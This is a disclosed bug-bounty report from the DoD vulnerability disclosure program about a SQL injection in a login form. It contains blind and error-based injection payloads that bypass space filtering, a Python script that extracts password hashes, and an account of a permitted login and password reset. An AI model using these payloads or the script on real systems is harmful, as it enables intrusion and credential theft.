{"id":982202,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODIyMDI=","url":"https://hackerone.com/reports/982202","title":"SQLi in login form of █████","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-09-14T21:00:44.346Z","submitted_at":"2020-09-14T21:00:44.360Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"erbbysam","url":"/erbbysam","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-29T20:28:46.838Z","bug_reporter_agreed_on_going_public_at":"2020-09-28T18:48:57.677Z","team_member_agreed_on_going_public_at":"2020-09-29T20:28:46.722Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nThe following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.\n\n```\nPOST /██████████.asp HTTP/█████.████\nHost: ███████\n```\n\n## Description\n```\nPOST /██████.asp HTTP/████.███\nHost: █████\nConnection: close\nContent-Length: 45\nCache-Control: max-age=0\nUpgr███████e-Insecure-Requests: ███\nOrigin: https://████\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?████████\nSec-Fetch-Dest: document\nReferer: https://████████/wireless/index.asp\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: █████████████████\n\nusr='/**/or/**/lastName!='\u0026pwd=██████████\n```\n\nreturns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.\n\nTo summarize: \n`usr='/**/or/**/lastName!='\u0026pwd=████████` -\u003e 302\n`usr='/**/or/**/abc!='\u0026pwd=███` -\u003e 500\n\ncase error g██████████get (which could be used to exfil data):\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)\u003e███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='\u0026pwd=████` -\u003e 302\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)\u003c██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='\u0026pwd=████████` -\u003e 500\n\nUsing this, we can prove that there are 26 user accounts:\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='\u0026pwd=████████` -\u003e 302\n`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='\u0026pwd=██████` -\u003e 500\n\nI have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.\n\n**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**\n\n## Impact\n\nSQLi, likely escalation to full service compromise","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["kegn","realtess","demonia","f0shuh0","z3rod3x","cipherd2","mr-datacoder","indiffirent7"],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9220730,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request ███████ditional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2020-09-14T21:00:44.910Z","updated_at":"2020-09-29T20:02:05.891Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9226438,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@erbbysam go ahe██████ and try and escalate your finding and see if you can login, you have our blessing to do this. Have fun storming the castle. ","automated_response":false,"created_at":"2020-09-15T12:04:10.482Z","updated_at":"2020-09-29T20:02:05.883Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9230555,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"In order to make everything work correctly below, I h█████████ to ███d a burp `Response he███████er` match/replace proxy rule of:\nMatch: `█████████mil`\nReplace: `████mil`\nThe site was not functional without this with le████s me to believe this is not meant to be exposed to the external internet.\n\n## Access Success\n\nOk, I was able to use this to access ███████ users information and login successfully:\n\niterating over the database, I identified 2 users:\nid `██████` -- username: `███████` password: `█████` (no hits on md5 reversing online)\nid `████████6` -- username: `█████` password: `█████` (== `md5(███████)` !!!!)\n\nusing `███:█████` I logged in and was greeted by a password reset page:\n█████\n\nI updated his password to `███████████████████████████████████████████` (it's clear he has not logged in to this system in a while with this insecure password, otherwise he would have been forced to reset this password alre█████████y).\n\nOnce I updated his password I was able to view this weeks ███████:\n███\n████████\n██████\n\nI stopped here and have not attempted to modify/██████████d/delete any data (except for `█████`'s password as described above). Based on the burp proxy rewrite rule required to make this site work I believe this is flight data for `██████` which I believe would be considered fairly sensitive.\n\nThe username:password `████:██████████████████████████████████████████` are valid on this site if you would like to test this (just make sure to ████████d the burp proxy rewrite rule above).\n\n## \n\n## Recommended remediation\n█████████) fix this SQLi\n2) don't store passwords as unsalted md5 hashes\n2) force password reset for all users \u0026 review access logs","automated_response":false,"created_at":"2020-09-15T19:51:30.795Z","updated_at":"2020-09-29T20:04:20.551Z","actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9230644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is the script I ended up using for gathering data from this sqli as sqlmap did not work (this is configured to grab the user `████`'s password hash):\n```\nimport requests\n\nhe██████ers = {'Content-Type': 'application/x-www-form-urlencoded'}\nfield = 'pwd'\nid='██████6'\nprefix = \"\"\n\nwhile True:\n\n    hit = False\n    for i in range(48,90):\n        dataInput=\"usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/qqqq/**/FROM/**/accounts/**/WHERE/**/id=\"+id+\")='zzzz')/**/THEN/**/'a'/**/ELSE/**/██████/**/END)/**/and/**/usr!='\u0026pwd=█████\"\n        dataInput = dataInput.replace('qqqq','substring('+field+',███,'+str(len(prefix)+█████)+')')\n        dataInput = dataInput.replace('zzzz',prefix+chr(i))\n        r = requests.post('https://█████/███.asp', data=dataInput, verify=False, allow_redirects=False, he████████ers=he██████ers)\n        if r.status_code == 500:\n            print(\"HIT \"+chr(i))\n            prefix = prefix + chr(i)\n            hit = True\n            break\n\n    if hit == False:\n        print(\"all done -- \"+prefix)\n        break\n```\n\nThis eventually printed out `all done -- █████████` when I ran it previously.","automated_response":false,"created_at":"2020-09-15T19:56:48.433Z","updated_at":"2020-09-29T20:28:08.094Z","actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9230749,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-15T20:14:42.913Z","updated_at":"2020-09-15T20:14:42.913Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":846987},"actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9230750,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-09-15T20:14:44.779Z","updated_at":"2020-09-15T20:14:44.779Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9230801,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@erbbysam great find, great follow through and fantastic write up!","automated_response":false,"created_at":"2020-09-15T20:18:03.672Z","updated_at":"2020-09-15T20:18:03.672Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9333439,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks like this has been resolved as https://███████/ is no longer online.\nThanks,\nSam","automated_response":false,"created_at":"2020-09-25T18:22:06.147Z","updated_at":"2020-09-29T19:57:32.307Z","actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9357651,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2020-09-28T18:15:46.635Z","updated_at":"2020-09-28T18:15:46.635Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"erbbysam","url":"/erbbysam"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9358219,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-28T18:48:57.711Z","updated_at":"2020-09-28T18:48:57.711Z","first_to_agree":true,"actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9369458,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","automated_response":false,"created_at":"2020-09-29T20:28:46.746Z","updated_at":"2020-09-29T20:28:46.746Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9369459,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-29T20:28:46.863Z","updated_at":"2020-09-29T20:28:46.863Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9369460,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2020-09-29T20:28:52.380Z","updated_at":"2020-09-29T20:28:52.380Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}